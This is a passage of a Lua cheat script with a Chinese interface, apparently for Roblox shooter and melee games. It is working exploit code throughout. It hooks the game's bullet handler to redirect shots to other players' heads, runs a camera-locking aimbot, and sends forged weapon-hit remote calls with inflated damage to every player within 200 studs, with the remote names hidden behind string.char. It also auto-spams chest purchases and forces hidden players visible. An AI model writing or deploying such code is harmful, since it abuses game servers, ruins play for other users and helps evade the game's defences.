    secMove:Slider({ Name = "重力设置", Value = { Min = 0, Max = 500, Default = 196 }, Callback = function(v) Workspace.Gravity = v end })
    secMove:Slider({ Name = "快速跑步速度", Value = { Min = 1, Max = 500, Default = 1 }, Callback = function(v) FL.speedValue = v end })
    secMove:Toggle({ Name = "开启快速跑步", Value = false, Callback = function(v) FL.speedEnabled = v; flSetupSpeed() end })

    local secCombat = tabFlash:Section({ Name = "战斗功能", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secCombat:Toggle({ Name = "子追（美国子弹）", Value = false, Callback = function(state)
        local bh = require(ReplicatedStorage.ModuleScripts.GunModules.BulletHandler)
        if state then
            if not FL.originalFire then FL.originalFire = bh.Fire end
            bh.Fire = function(data)
                local cam = Workspace.CurrentCamera
                local cp, cd = nil, 999
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer and plr.Character then
                        local hum = plr.Character:FindFirstChild("Humanoid")
                        local head = plr.Character:FindFirstChild("Head")
                        if head and hum and hum.Health > 0 then
                            local sp, os = cam:WorldToViewportPoint(head.Position)
                            if os then
                                local d = (Vector2.new(sp.X, sp.Y) - cam.ViewportSize/2).Magnitude
                                if d < cd then cp = head; cd = d end
                            end
                        end
                    end
                end
                if cp then
                    data.Force = data.Force * 1000
                    data.Direction = (cp.Position - data.Origin).Unit
                end
                return FL.originalFire(data)
            end
        else
            if FL.originalFire then bh.Fire = FL.originalFire end
        end
    end })
    secCombat:Toggle({ Name = "自动加入对战", Value = false, Callback = function(state)
        FL.autoLobby = state
        if state and not FL.autoLobbyThread then
            FL.autoLobbyThread = coroutine.wrap(function()
                while FL.autoLobby do
                    task.wait()
                    local ok, vm = pcall(function() return Workspace:FindFirstChild("ViewModel") end)
                    if ok and vm == nil then
                        ReplicatedStorage.Remotes.Command:FireServer("Lobby")
                        task.wait(0.35)
                        ReplicatedStorage.Remotes.Command:FireServer("Play")
                        task.wait(0.35)
                    end
                end
                FL.autoLobbyThread = nil
            end)
            FL.autoLobbyThread()
        elseif not state and FL.autoLobbyThread then
            FL.autoLobbyThread = nil
        end
    end })
    secCombat:Toggle({ Name = "杀戮(看谁谁死)", Value = false, Callback = function(v) FL.ragebot = v; flToggleRagebot(v) end })

    local secAlert = tabFlash:Section({ Name = "辅助提醒", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secAlert:Toggle({ Name = "偷袭检测", Value = false, Callback = function(v) FL.backstabCheck = v end })
    secAlert:Toggle({ Name = "死亡提醒", Value = false, Callback = function(v)
        FL.deathCheck = v
        if v then flSetupDeath() end
    end })

    local Aim = {
        Enabled = false, FOV = 100, Smoothness = 10, CrosshairDistance = 5,
        FOVColor = Color3.fromRGB(0,255,0), FriendCheck = true, WallCheck = true,
        TargetPlayer = nil, TargetAll = true, FOVRainbowEnabled = true,
        FOVRainbowSpeed = 8, FOVEnabled = true,
    }
    local aimConn = nil
    local FOVCircle = nil
    local CurrentFOVHue = 0
    local AimCurrentTarget = nil
    local AimBlacklist = {}
    local AimTeamCheck = false
    local AimTargetPart = "Head"

    local function getRainbow(hue)
        hue = hue % 1
        local r,g,b
        local i = math.floor(hue*6)
        local f = hue*6-i
        local p = 1
        local q = 1-f
        local t = f
        if i%6==0 then r,g,b=1,t,p
        elseif i%6==1 then r,g,b=q,1,p
        elseif i%6==2 then r,g,b=p,1,t
        elseif i%6==3 then r,g,b=p,q,1
        elseif i%6==4 then r,g,b=t,p,1
        else r,g,b=1,p,q end
        return Color3.new(r,g,b)
    end

    local function initFOV()
        if not FOVCircle then
            FOVCircle = Drawing.new("Circle")
            FOVCircle.Thickness = 2
            FOVCircle.Filled = false
            FOVCircle.Radius = Aim.FOV
            FOVCircle.Position = Workspace.CurrentCamera.ViewportSize/2
        end
    end
    local function updateFOV()
        if FOVCircle then
            FOVCircle.Visible = Aim.Enabled and Aim.FOVEnabled
            FOVCircle.Radius = Aim.FOV
            FOVCircle.Color = Aim.FOVRainbowEnabled and getRainbow(CurrentFOVHue) or Aim.FOVColor
            FOVCircle.Position = Workspace.CurrentCamera.ViewportSize/2
        end
    end
    local function cleanupFOV()
        if FOVCircle then FOVCircle:Remove() FOVCircle = nil end
    end

    local function isFriend(plr)
        if not Aim.FriendCheck then return false end
        local ok, res = pcall(function() return LocalPlayer:IsFriendsWith(plr.UserId) end)
        return ok and res
    end

    local function wallCheck(targetPos, targetChar)
        if not Aim.WallCheck then return true end
        local ok, res = pcall(function()
            local cam = Workspace.CurrentCamera
            local origin = cam.CFrame.Position
            local dir = (targetPos-origin).Unit
            local dist = (targetPos-origin).Magnitude
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances = {LocalPlayer.Character, targetChar}
            rp.FilterType = Enum.RaycastFilterType.Blacklist
            rp.IgnoreWater = true
            return Workspace:Raycast(origin, dir*dist, rp) == nil
        end)
        return ok and res
    end

    local function getTargetPos(char, partName)
        if not char then return nil end
        partName = tostring(partName)
        local key = string.lower(partName):gsub("%s+", "")
        local function first(...)
            for i = 1, select("#", ...) do
                local n = select(i, ...)
                local p = char:FindFirstChild(n)
                if p and p:IsA("BasePart") then return p end
            end
            return nil
        end
        local part
        if key == "head" then
            part = first("Head")
        elseif key == "uppertorso" then
            part = first("UpperTorso", "Torso", "HumanoidRootPart")
        elseif key == "leftleg" then
            part = first("LeftUpperLeg", "Left Leg", "LeftLowerLeg")
        elseif key == "rightleg" then
            part = first("RightUpperLeg", "Right Leg", "RightLowerLeg")
        else
            part = first("Head")
        end
        return part and part.Position
    end

    local function getClosest()
        local cam = Workspace.CurrentCamera
        local mouse = cam.ViewportSize/2
        local nearest, shortest = nil, Aim.FOV
        if Aim.TargetPlayer and type(Aim.TargetPlayer) == "string" and not Aim.TargetAll then
            local t = Players:FindFirstChild(Aim.TargetPlayer)
            if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
                local inBL = false
                for _, n in ipairs(AimBlacklist) do if t.Name == n then inBL = true break end end
                if not inBL then
                    if AimTeamCheck and LocalPlayer.Team and t.Team == LocalPlayer.Team then return nil end
                    local hum = t.Character:FindFirstChild("Humanoid")
                    if hum and hum.Health > 0 then
                        local pos = t.Character.HumanoidRootPart.Position
                        local sp, os = cam:WorldToViewportPoint(pos)
                        if os then
                            local d = (Vector2.new(sp.X,sp.Y)-mouse).Magnitude
                            if d <= Aim.FOV and wallCheck(pos, t.Character) then
                                if not Aim.FriendCheck or not isFriend(t) then
                                    AimCurrentTarget = t
                                    return t
                                end
                            end
                        end
                    end
                end
            end
            AimCurrentTarget = nil
            return nil
        end
        if AimCurrentTarget and AimCurrentTarget ~= LocalPlayer and AimCurrentTarget.Character then
            local hrp = AimCurrentTarget.Character:FindFirstChild("HumanoidRootPart")
            local hum = AimCurrentTarget.Character:FindFirstChild("Humanoid")
            if hrp and hum and hum.Health > 0 then
                local inBL = false
                for _, n in ipairs(AimBlacklist) do if AimCurrentTarget.Name == n then inBL = true break end end
                if not inBL then
                    if AimTeamCheck and LocalPlayer.Team and AimCurrentTarget.Team == LocalPlayer.Team then AimCurrentTarget = nil return nil end
                    local sp, os = cam:WorldToViewportPoint(hrp.Position)
                    if os then
                        local d = (Vector2.new(sp.X,sp.Y)-mouse).Magnitude
                        if d <= Aim.FOV and wallCheck(hrp.Position, AimCurrentTarget.Character) then
                            if not Aim.FriendCheck or not isFriend(AimCurrentTarget) then return AimCurrentTarget end
                        end
                    end
                end
            end
        end
        AimCurrentTarget = nil
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local skip = false
                if Aim.FriendCheck and isFriend(plr) then skip = true end
                if not skip then
                    for _, n in ipairs(AimBlacklist) do if plr.Name == n then skip = true break end end
                end
                if not skip and AimTeamCheck and LocalPlayer.Team and plr.Team == LocalPlayer.Team then skip = true end
                if not skip then
                    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    local hum = plr.Character:FindFirstChild("Humanoid")
                    if hrp and hum and hum.Health > 0 and wallCheck(hrp.Position, plr.Character) then
                        local sp, os = cam:WorldToViewportPoint(hrp.Position)
                        if os then
                            local d = (Vector2.new(sp.X,sp.Y)-mouse).Magnitude
                            if d < shortest then shortest = d; nearest = plr end
                        end
                    end
                end
            end
        end
        if nearest then AimCurrentTarget = nearest end
        return nearest
    end

    local function aimBot()
        if not Aim.Enabled then return end
        pcall(function()
            local cam = Workspace.CurrentCamera
            local t = getClosest()
            if t and t.Character then
                local hrp = t.Character:FindFirstChild("HumanoidRootPart")
                local head = t.Character:FindFirstChild("Head")
                local tpos = getTargetPos(t.Character, AimTargetPart) or (head and head.Position) or (hrp and hrp.Position)
                if not tpos then return end
                if hrp and Aim.CrosshairDistance > 0 then
                    local vel = hrp.Velocity
                    local dist = (tpos-cam.CFrame.Position).Magnitude
                    local time = dist/1000
                    tpos = tpos + (vel*time*Aim.CrosshairDistance)
                end
                local cur = cam.CFrame
                local tcf = CFrame.new(cur.Position, tpos)
                cam.CFrame = cur:Lerp(tcf, 1/Aim.Smoothness)
            end
        end)
    end

    local function toggleAim(state)
        Aim.Enabled = state
        if state then
            initFOV()
            updateFOV()
            if aimConn then aimConn:Disconnect() end
            aimConn = RunService.RenderStepped:Connect(function(dt)
                pcall(function()
                    if Aim.FOVRainbowEnabled then CurrentFOVHue = CurrentFOVHue + dt*Aim.FOVRainbowSpeed/10 end
                    updateFOV()
                    aimBot()
                end)
            end)
        else
            if aimConn then aimConn:Disconnect() aimConn = nil end
            cleanupFOV()
            AimCurrentTarget = nil
        end
    end

    local tabAim = Soundify(Window:Tab("自瞄设置", "83701039519151"))
    local secAim = tabAim:Section({ Name = "自瞄设置", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secAim:Toggle({ Name = "启用自瞄", Value = false, Callback = function(v)
        if type(v) == "table" then v = v.Value or v[1] or v.Enabled or false end
        toggleAim(v and true or false)
    end })
    secAim:Toggle({ Name = "FOV开关", Value = true, Callback = function(v) Aim.FOVEnabled = v; updateFOV() end })
    secAim:Toggle({ Name = "FOV彩虹效果", Value = true, Callback = function(v) Aim.FOVRainbowEnabled = v; updateFOV() end })
    secAim:Slider({ Name = "FOV彩虹速度", Value = { Min = 1, Max = 20, Default = 8 }, Callback = function(v) Aim.FOVRainbowSpeed = v end })
    secAim:Slider({ Name = "自瞄范围 (FOV)", Value = { Min = 50, Max = 500, Default = 100 }, Callback = function(v) Aim.FOV = v; updateFOV() end })
    secAim:Slider({ Name = "自瞄平滑度", Value = { Min = 1, Max = 50, Default = 10 }, Callback = function(v) Aim.Smoothness = v end })
    secAim:Slider({ Name = "预判距离", Value = { Min = 0, Max = 20, Default = 5 }, Callback = function(v) Aim.CrosshairDistance = v end })
    secAim:Toggle({ Name = "好友检测", Value = true, Callback = function(v) Aim.FriendCheck = v end })
    secAim:Toggle({ Name = "墙壁检测", Value = true, Callback = function(v) Aim.WallCheck = v end })
    secAim:Toggle({ Name = "队伍检测", Value = false, Callback = function(v) AimTeamCheck = v end })
    secAim:Toggle({ Name = "目标自瞄模式", Value = false, Callback = function(v)
        if type(v) == "table" then v = v.Value or v[1] or false end
        Aim.TargetAll = not (v and true or false)
        AimCurrentTarget = nil
    end })

    local playerList = {}
    for _, p in ipairs(Players:GetPlayers()) do if p ~= LocalPlayer then table.insert(playerList, p.Name) end end
    local targetDropdown = secAim:Dropdown({ Name = "选择目标玩家", Options = playerList, Callback = function(v)
        local val
        if type(v) == "table" then
            val = v[1] or v.Value or v.Option or v.Name
        else
            val = v
        end
        Aim.TargetPlayer = val and tostring(val) or nil
        AimCurrentTarget = nil
    end })
    Players.PlayerAdded:Connect(function(p)
        table.insert(playerList, p.Name)
        if targetDropdown and targetDropdown.Refresh then
            pcall(function() targetDropdown.Refresh(playerList) end)
        end
    end)
    Players.PlayerRemoving:Connect(function(p)
        for i, n in ipairs(playerList) do if n == p.Name then table.remove(playerList, i) break end end
        if targetDropdown and targetDropdown.Refresh then
            pcall(function() targetDropdown.Refresh(playerList) end)
        end
    end)

    secAim:Dropdown({ Name = "自瞄部位", Options = {"Head","UpperTorso","LeftLeg","RightLeg"}, Callback = function(v)
        local val
        if type(v) == "table" then
            val = v[1] or v.Value or v.Option or v.Name
        else
            val = v
        end
        AimTargetPart = val and tostring(val) or "Head"
        AimCurrentTarget = nil
    end })

    local blacklistInput = secAim:Textbox({ Name = "自瞄黑名单（逗号分隔）", Placeholder = "Player1,Player2", Callback = function(v)
        local names = {}
        for n in string.gmatch(v, "[^,]+") do n = n:match("^%s*(.-)%s*$"); if n ~= "" then table.insert(names, n) end end
        AimBlacklist = names
    end })
    secAim:Button({ Name = "添加当前目标到黑名单", Callback = function()
        if AimCurrentTarget and AimCurrentTarget.Name then
            local n = AimCurrentTarget.Name
            for _, x in ipairs(AimBlacklist) do if x == n then return end end
            table.insert(AimBlacklist, n)
            if blacklistInput and blacklistInput.SetValue then blacklistInput:SetValue(table.concat(AimBlacklist, ", ")) end
        end
    end })
    secAim:Button({ Name = "清空白名单", Callback = function()
        AimBlacklist = {}
        if blacklistInput and blacklistInput.SetValue then blacklistInput:SetValue("") end
    end })

    local quick = secAim:Section({ Name = "快速设置", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    quick:Button({ Name = "强锁[子弹有延迟类] FOV99 平滑1 预判0.96", Callback = function()
        Aim.FOV = 99; Aim.Smoothness = 1; Aim.CrosshairDistance = 0.96; updateFOV()
    end })
    quick:Button({ Name = "强锁[子弹无延迟] FOV120 平滑1 预判0", Callback = function()
        Aim.FOV = 120; Aim.Smoothness = 1; Aim.CrosshairDistance = 0; updateFOV()
    end })
    quick:Button({ Name = "平滑类 FOV130 平滑6 预判1", Callback = function()
        Aim.FOV = 130; Aim.Smoothness = 6; Aim.CrosshairDistance = 1; updateFOV()
    end })
end

if isSA then
    local SA = {
        enabled = false, range = 200, height = 200, interval = 0.01,
        basicChest = false, divineChest = false, chestInterval = 0.5,
        autoEquip = false, showModels = false,
    }

    local saRemote
    pcall(function()
        local events = ReplicatedStorage:FindFirstChild("Events")
        if events then saRemote = events:FindFirstChild("GameRemoteFunction") end
    end)

    local saE = string.char(65,116,116,101,109,112,116,87,101,97,112,111,110,72,105,116)
    local saGacha = string.char(65,116,116,101,109,112,116,82,111,108,108,71,97,99,104,97,67,104,101,115,116)

    local function saDoHit()
        if not saRemote then return end
        local ch = LocalPlayer.Character
        if not ch then return end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local myPos = hrp.Position
        local mx, my, mz = myPos.X, myPos.Y, myPos.Z
        local tool = ch:FindFirstChild("Steel")
        local hits, idx = {}, 0
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                local tch = p.Character
                if tch then
                    local thrp = tch:FindFirstChild("HumanoidRootPart")
                    local hum = tch:FindFirstChild("Humanoid")
                    if thrp and hum and hum.Health > 0 then
                        local tp = thrp.Position
                        local hd = math.sqrt((tp.X-mx)^2 + (tp.Z-mz)^2)
                        local vd = math.abs(tp.Y-my)
                        if hd <= SA.range and vd <= SA.height then
                            idx = idx + 1
                            local dx, dy, dz = tp.X-mx, tp.Y-my, tp.Z-mz
                            local mg = math.sqrt(dx*dx+dy*dy+dz*dz)
                            if mg < 0.001 then mg = 0.001 end
                            hits[idx] = {
                                knockback = 50, isClosestEnemy = (idx == 1), origin = tp,
                                enemyModel = tch, distance = mg,
                                direction = Vector3.new(dx/mg, dy/mg, dz/mg),
                            }
                        end
                    end
                end
            end
        end
        if idx == 0 then return end
        local args = { saE, {}, hits }
        local w = args[2]
        w.hitboxOffset = Vector3.new(0,0,-1.5); w.knockback = 50
        w.shouldLock = true; w.shouldSlow = true
        w.attackCycleData = { knockbackMul=1, slowMult=0.2, slowTime=1.5, lungeMul=1, attackTime=0.65 }
        w.isCritical = false
        local ac = {}
        ac["1"] = {knockbackMul=1,slowMult=0.2,slowTime=1.5,lungeMul=1,attackTime=0.65}
        ac["4"] = {lungeMult=2.25,hitboxOffsetAdd=Vector3.new(0,0,-1.5),slowMult=0.2,slowTime=1.5,hitboxSizeAdd=Vector3.new(0,0,3),knockbackMult=2.25,attackTime=0.9833333333333333}
        ac["3"] = {lungeMult=0.75,slowMult=0.2,slowTime=1.5,knockbackMult=1.5,attackTime=0.7166666666666667}
        ac["2"] = {lungeMult=1,slowMult=0.2,slowTime=1.5,knockbackMult=1,attackTime=0.65}
        w.weaponDefinition = { attackCycle=ac, attackOrder={[1]="1",[2]="2",[3]="3",[4]="4"} }
        w.attackCooldown = 0; w.hitboxSize = Vector3.new(9,14,8)
        w.lungeKnockback = 55; w.slowTime = 1.5; w.slowMult = 0.2
        w.cycleIndex = 1; w.damage = 100; w.tool = tool; w.shouldLunge = true
        saRemote:InvokeServer(unpack(args))
    end

    task.spawn(function()
        while true do
            if SA.enabled then task.spawn(function() pcall(saDoHit) end) end
            task.wait(SA.interval)
        end
    end)
    task.spawn(function()
        while true do
            if SA.basicChest and saRemote then task.spawn(function() pcall(function() saRemote:InvokeServer(saGacha, "Basic") end) end) end
            task.wait(SA.chestInterval)
        end
    end)
    task.spawn(function()
        while true do
            if SA.divineChest and saRemote then task.spawn(function() pcall(function() saRemote:InvokeServer(saGacha, "Divine") end) end) end
            task.wait(SA.chestInterval)
        end
    end)
    task.spawn(function()
        while true do
            if SA.autoEquip then
                local ch = LocalPlayer.Character
                if ch then
                    local hum = ch:FindFirstChild("Humanoid")
                    local bp = LocalPlayer:FindFirstChild("Backpack")
                    if hum and bp then
                        for _, v in ipairs(bp:GetChildren()) do
                            if v:IsA("Tool") then pcall(function() hum:EquipTool(v) end) break end
                        end
                    end
                end
            end
            task.wait(0.1)
        end
    end)

    task.spawn(function()
        while true do
            if SA.showModels then
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer then
                        local tch = p.Character
                        if tch then
                            for _, obj in ipairs(tch:GetDescendants()) do
                                if obj:IsA("BasePart") then
                                    pcall(function() obj.Transparency = 0; obj.LocalTransparencyModifier = 0; obj.CastShadow = true end)
                                elseif obj:IsA("Decal") or obj:IsA("Texture") then
                                    pcall(function() obj.Transparency = 0 end)
                                elseif obj:IsA("ForceField") then
                                    pcall(function() obj.Visible = true end)
                                end
                            end
                            local hum = tch:FindFirstChildOfClass("Humanoid")
                            if hum then pcall(function() hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None end) end
                            pcall(function() tch.PrimaryPart = tch:FindFirstChild("HumanoidRootPart") end)
                        end
                    end
                end
            end
            task.wait(0.1)
        end
    end)

    local tabSA = Soundify(Window:Tab("沉默的刺客", "83701039519151"))
    local secAura = tabSA:Section({ Name = "杀戮光环", SubName = "必须拿刀且是初始刀", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secAura:Toggle({ Name = "启用杀戮光环", Value = false, Callback = function(v) SA.enabled = v end })
    secAura:Slider({ Name = "范围半径（水平）", Value = { Min = 5, Max = 200, Default = 200 }, Callback = function(v) SA.range = v end })
    secAura:Slider({ Name = "高度范围（上下）", Value = { Min = 5, Max = 200, Default = 200 }, Callback = function(v) SA.height = v end })
    secAura:Slider({ Name = "执行间隔", Value = { Min = 0.01, Max = 1, Default = 0.01 }, Callback = function(v) SA.interval = v end })

    local secChest = tabSA:Section({ Name = "自动抽宝箱", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secChest:Toggle({ Name = "自动抽取普通宝箱", Value = false, Callback = function(v) SA.basicChest = v end })
    secChest:Toggle({ Name = "自动抽取神圣宝箱", Value = false, Callback = function(v) SA.divineChest = v end })
    secChest:Slider({ Name = "抽宝箱间隔", Value = { Min = 0.1, Max = 5, Default = 0.5 }, Callback = function(v) SA.chestInterval = v end })
    secChest:Toggle({ Name = "自动拿起刀", Value = false, Callback = function(v) SA.autoEquip = v end })

    local secVisual = tabSA:Section({ Name = "显示", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secVisual:Toggle({ Name = "显示人物建模（强制显现）", Value = false, Callback = function(v) SA.showModels = v end })
end

local tabMusic = Soundify(Window:Tab("音乐", "83701039519151"))
local sectionHall = tabMusic:Section({ Name = "音乐大厅", SubName = "推荐音乐", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local musicLibrary = {
    {name = "雨爱", id = "rbxassetid://79277371759525"},
    {name = "起风了", id = "rbxassetid://99498025749186"},
    {name = "鸟之诗", id = "rbxassetid://113665010217108"},
    {name = "唯一", id = "rbxassetid://138570939058838"},
    {name = "认清现实", id = "rbxassetid://136847919947471"},
    {name = "植物大战僵尸", id = "rbxassetid://75726877618550"},
    {name = "Passo bem solto", id = "rbxassetid://106185171358009"},
    {name = "循环小曲", id = "rbxassetid://116273924154778"},
    {name = "Best Friend Remix", id = "rbxassetid://86857426956968"},
    {name = "索尼克EXE", id = "rbxassetid://131415306381990"},
    {name = "Unhappy", id = "rbxassetid://88523902860927"},
    {name = "凤凰", id = "rbxassetid://77715601943266"},
}
for _, m in ipairs(musicLibrary) do
    sectionHall:Audio({ Name = m.name, SubName = "音乐大厅", Audio = m.id, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end

local sectionCustomMusic = tabMusic:Section({ Name = "自定义音乐", SubName = "输入ID播放音乐", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local customMusicId = ""
sectionCustomMusic:Textbox({ Name = "输入音乐ID（纯数字）", Placeholder = "例如：12345678", Callback = function(v) customMusicId = v end })
sectionCustomMusic:Button({ Name = "加载自定义音乐", Callback = function()
    if customMusicId == "" then return end
    sectionCustomMusic:Audio({ Name = "自定义音乐 - " .. customMusicId, SubName = "自定义", Audio = "rbxassetid://" .. customMusicId, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end })

local sectionBattle = tabMusic:Section({ Name = "一些梗音效", SubName = "搞笑音效集合", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local battleSounds = {
    {name = "乌鲁鲁", id = "rbxassetid://80701295792893"},
    {name = "关注塔菲谢谢喵", id = "rbxassetid://126774078187195"},
    {name = "大东北", id = "rbxassetid://134786908423441"},
    {name = "骷髅敲盾", id = "rbxassetid://109255721227659"},
    {name = "🧊🧊🧊", id = "rbxassetid://118192325368354"},
    {name = "叹气", id = "rbxassetid://88227888377765"},
    {name = "真的很帅", id = "rbxassetid://115207043627098"},
    {name = "康神开播了", id = "rbxassetid://71129270589179"},
}
for _, s in ipairs(battleSounds) do
    sectionBattle:Audio({ Name = s.name, SubName = "梗音效", Audio = s.id, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end
